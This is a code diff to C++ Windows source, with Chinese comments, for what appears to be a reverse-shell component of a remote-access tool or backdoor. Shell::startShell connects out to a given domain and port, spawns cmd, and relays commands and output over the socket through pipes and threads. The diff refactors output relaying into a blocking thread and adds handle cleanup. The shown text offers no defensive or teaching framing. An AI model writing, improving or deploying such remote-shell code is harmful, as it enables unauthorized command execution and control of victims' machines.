@@ -1,8 +1,8 @@
 #include "pch.h"
 #include "Shell.h"
 
-#define SEND_SIZE   512
-#define RESULT_SIZE 2048
+#define SEND_SIZE   1024
+#define RESULT_SIZE 4096
 
 static Shell gShell; // 初始化类
 static TcpSocket gSock;
@@ -33,8 +33,13 @@ void Shell::startShell(std::string domain, int port) {
 
 	// 创建负责输入命令的线程
 	HANDLE hReadSock = CreateThread(NULL, 0, Shell::threadReadSock, (LPVOID)NULL, 0, NULL);
-	if (!hReadSock) {
+	HANDLE hReadPipe = CreateThread(NULL, 0, Shell::threadReadPipe, (LPVOID)NULL, 0, NULL);
+	if ((!hReadSock) || (!hReadPipe)) {
 		OutputDebugStringA("Failed to create new thread read socket\r\n");
+		CloseHandle(ghReadPipe1);
+		CloseHandle(ghReadPipe2);
+		CloseHandle(ghWritePipe1);
+		CloseHandle(ghWritePipe2);
 		gSock.dissconnect();
 		TerminateProcess(gPi.hProcess, 0);
 		return;
@@ -78,6 +83,7 @@ bool Shell::createCmd() {
 		return false;
 	}
 
+	
 	return true;
 }
 
@@ -101,31 +107,22 @@ DWORD Shell::threadReadSock(LPVOID args) {
 		}
 	}
 
+	CloseHandle(ghReadPipe1);
+	CloseHandle(ghReadPipe2);
+	CloseHandle(ghWritePipe1);
+	CloseHandle(ghWritePipe2);
 	TerminateProcess(gPi.hProcess, 0);
 	gSock.dissconnect();
 	return 1;
 }
 
 // 接收cmd回显并传送
-void Shell::flushResults() {
+DWORD Shell::threadReadPipe(LPVOID args) {
 
-	do
-	{
+	while (true) {
 		DWORD dwBytesResult = 0;
 		RtlZeroMemory(szResult, sizeof(szResult));
-		// 先看有没有数据 防止没有数据还去读引起堵塞
-		if (!PeekNamedPipe(ghReadPipe1, szResult, sizeof(szResult), &dwBytesResult, NULL, NULL)) {
-			OutputDebugStringA("cannot peek pipe and stop shell\r\n");
-			break;
-		}
-
-		// 刷新成功但是没有数据
-		if (!dwBytesResult) {
-			return;
-		}
-
-		// 有数据就读
-		RtlZeroMemory(szResult, sizeof(szResult));
+		// 不用看有没有数据 堵塞可以避免线程做无用功
 		if (!ReadFile(ghReadPipe1, szResult, sizeof(szResult), &dwBytesResult, NULL)) {
 			OutputDebugStringA("cannot read pipe and stop shell\r\n");
 			break;
@@ -136,8 +133,8 @@ void Shell::flushResults() {
 			OutputDebugStringA("cannot write socket and stop shell\r\n");
 			break;
 		}
-
-	} while (false);
-
-	// 这里在斟酌怎么合理地安排处理后事
+	}
+	gSock.dissconnect();
+	// 这里把关闭cmd进程的任务给了读取socket的线程
+	return 1;
 }
